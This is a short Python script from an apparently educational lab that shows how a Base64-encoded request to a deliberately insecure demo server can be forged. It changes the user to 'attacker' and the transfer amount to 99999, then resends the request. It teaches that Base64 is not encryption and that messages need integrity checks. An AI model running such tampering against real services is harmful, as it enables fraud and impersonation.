# stage1_insecure_protocols/2_base64_fake_encryption/attacker.py

"""
attacker.py - Base64 Replay and Tampering Attack

This script simulates an attacker who:
1. Understands the structure of the Base64-encoded request.
2. Forges a new message by replacing key values (e.g., username or amount).
3. Re-encodes the modified plaintext using Base64.
4. Sends the forged message to the server to exploit the lack of authentication or integrity checks.

Vulnerabilities exploited:
- Base64 offers no encryption or protection against tampering.
- The server does not validate sender identity or message authenticity.

Usage:
    python attacker.py --port 9000
"""

import base64
import argparse

from config import DEFAULT_HOST

from utils.attacker_runner import run_tcp_attack

# Parse command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument("--port", type=int, required=True, help="Target server port")
args = parser.parse_args()

server_host = DEFAULT_HOST
server_port = args.port

# Simulate intercepted original message
original_plaintext = "username=alice&action=transfer&amount=1000"

# Modify intercepted message to impersonate another user and increase transfer amount
malicious_plaintext = original_plaintext.replace("alice", "attacker").replace("1000", "99999")

# Encode modified message using Base64
encoded = base64.b64encode(malicious_plaintext.encode()).decode()

# Launch attack by sending tampered Base64-encoded message to server
response = run_tcp_attack(server_host, server_port, malicious_plaintext, encoded, verbose=True)

print()